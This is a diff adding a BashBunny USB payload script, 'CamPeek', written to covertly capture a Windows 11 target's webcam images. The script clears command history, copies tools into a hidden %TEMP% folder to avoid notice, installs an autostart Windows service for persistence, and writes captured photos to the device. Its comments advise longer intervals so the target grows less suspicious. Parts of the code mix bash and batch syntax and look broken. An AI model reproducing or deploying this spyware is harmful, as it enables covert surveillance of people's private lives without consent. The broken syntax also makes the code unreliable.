@@ -1,0 +1,72 @@
+# CamPeek BashBunny Payload
+#
+# Description: The CamPeek payload peeks through the target's webcam, captures images, and stores them in the BashBunny. It has two modules: Deployment, which deploys the payload on the target system, and Exfiltration, which stores the saved loot from the target system in the BashBunny. The payload is persistent and autostarts on boot. It works on Windows 11.
+#
+# Features:
+#   - Robust Payload for capturing targets' images.
+#   - No additional dependencies required.
+#   - Persistent.
+#   - Autostart payload on boot.
+#
+# Payload Workflow:
+#   - Stop storing history.
+#   - Grep BashBunny's mount point.
+#   - Create a hidden directory in %TEMP% for obfuscation.
+#   - Copy ffmpeg and image capturing mechanism to the target system.
+#   - Create a Windows service for persistence and triggering mechanism for autostart.
+#
+# Changes to be made:
+#   - Change the time interval of capturing the image. The longer the time interval, the less suspicious the target is. The default time interval is 120 seconds. Make changes in systemBus on line number 4.
+#
+# LED Status:
+#   - SETUP: MAGENTA
+#   - ATTACK: YELLOW
+#   - FINISH: GREEN
+#
+# Note:
+#   - Download pre-compiled static build of ffmpeg from: https://github.com/drapl0n/temp/releases/download/ffmpeg/ffmpeg and move it into the camPeek directory.
+#   - Due to the big size of the binary, it is not provided in this repo.
+#   - Create a directory named camPeek in /loot/ for storing captured images.
+#
+# Directory Structure of payload components:
+#   - switch1/payload.txt: /payloads/switch1/
+#   - switch2/payload.txt: /payloads/switch2/
+#   - camPeek/: /payloads/library/
+
+# Deployment Module
+
+LED SETUP
+
+# Stop storing history
+powershell.exe -Command Clear-History
+
+# Grep BashBunny's mount point
+SET BB_MOUNT=%%~d0
+SET BB_MOUNT=%BB_MOUNT%\loot
+
+# Create a hidden directory in %TEMP% for obfuscation
+powershell.exe -Command New-Item -ItemType Directory -Force -Path "%TEMP%\.hiddenCam"
+
+# Copy ffmpeg and image capturing mechanism to the target system
+xcopy .\camPeek\ %USERPROFILE%\AppData\Local\Temp\.hiddenCam /s /y
+
+# Create a Windows service for persistence and triggering mechanism for autostart
+sc.exe create CamPeek binPath= "\"%USERPROFILE%\AppData\Local\Temp\.hiddenCam\camPeek.exe\" -autostart" start= auto DisplayName= "CamPeek" 
+sc.exe start CamPeek
+
+LED ATTACK
+
+# Exfiltration Module
+
+REM Wait for the specified time interval
+SET /A "DELAY=%systemBus%*1000"
+timeout /t %DELAY%
+
+
+# Capture image and store it in BashBunny
+FILENAME=$(echo %RANDOM%.jpg | tr -d '[:space:]')
+powershell.exe -Command "(New-Object -ComObject WIA.CommonDialog).ShowAcquireImage()" > $BB_MOUNT/loot/camPeek/$FILENAME
+
+# Blink LED to indicate completion
+LED R B 500
+LED G 1000
